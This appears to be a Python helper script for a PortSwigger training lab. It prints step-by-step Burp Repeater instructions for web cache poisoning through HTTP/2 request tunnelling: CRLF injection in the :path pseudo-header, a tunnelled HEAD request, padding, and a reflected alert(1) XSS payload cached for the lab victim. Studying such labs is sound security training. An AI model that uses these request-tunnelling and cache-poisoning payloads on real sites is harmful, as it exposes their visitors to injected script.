#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Web cache poisoning via HTTP/2 request tunnelling.

Documentation-first — HPACK framing with CRLF in :path pseudo-header needs
low-level HTTP/2 library control. Manual Burp Inspector + Shift+Enter is
the clean path.

Manual flow:

  1. Burp Repeater, Inspector → HTTP/2, Update Content-Length off.
  2. Confirm :path CRLF injection with a trivial payload.
  3. Set :method = HEAD. :path = tunnelled HEAD / + GET /post?postId=1.
     Response body contains blog post HTML → tunnelling confirmed.
  4. Repeat with /?cb=1 as outer path. Fetch /?cb=1 in another tab — blog
     post HTML cached → cache poisoning confirmed.
  5. Check normal GET / response Content-Length in proxy history. Call it N.
  6. Set :path to tunnel GET /resources?xss=<script>alert(1)</script>AAAA...
     Padding must make tunnelled response > N bytes. Generate with:
        python -c "print('A'*9000)"
  7. Confirm XSS fires on /?cachebuster=3 in a browser.
  8. Remove cachebuster. Send every ~5s to poison the real /.
  9. Lab solves when victim loads / and executes alert(1).
"""

import argparse
import re


MANUAL_INSTRUCTIONS = """
Burp Repeater (Inspector → HTTP/2, Update Content-Length off):

STEP 1 — Confirm :path injection:
  Inspector → :path value (Shift+Enter for newlines):
    /
    Foo: bar
  Send. Normal 200 confirms injection.

STEP 2 — Tunnel a GET /post?postId=1 to confirm tunnelling:
  :method: HEAD
  :path:
    / HTTP/1.1
    Host: {host}
    <blank>
    GET /post?postId=1 HTTP/1.1
    Host: {host}
    Foo: bar
  Response body contains blog post HTML.

STEP 3 — Cache poison with cachebuster:
  :path first line → /?cb=1 HTTP/1.1
  Send. Then GET /?cb=1 in browser — should return blog post content.

STEP 4 — Find XSS gadget:
  GET /resources?xss=<script>alert(1)</script> reflects query string unencoded.

STEP 5 — Measure normal response size:
  Check proxy history for GET / response Content-Length. Call it N (this lab: 8869).

STEP 6 — Tunnel XSS with padding:
  :path:
    /?cachebuster=3 HTTP/1.1
    Host: {host}
    <blank>
    GET /resources?xss=<script>alert(1)</script>AAAA...(9000 A's)...AAAA HTTP/1.1
    Host: {host}
    Foo: bar
  Padding = ~9000 A's (must make tunnelled response > N bytes).
  Generate: python -c "print('A'*9000)"
  Send. Response returns (no timeout); contains reflected XSS.

STEP 7 — Confirm via cachebuster:
  Browser: https://{host}/?cachebuster=3 → alert(1) fires.

STEP 8 — Poison real /:
  :path first line → / HTTP/1.1 (no cachebuster)
  Send every ~5 seconds for a minute or so.
  Victim loads / every ~15s → cached XSS fires → lab solved.
"""


def main():
    parser = argparse.ArgumentParser(
        description="Lab 18: HTTP/2 tunnelling cache poisoning (manual steps)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    host = re.sub(r"^https?://", "", args.lab_url.rstrip("/"))
    print(MANUAL_INSTRUCTIONS.format(host=host))


if __name__ == "__main__":
    main()
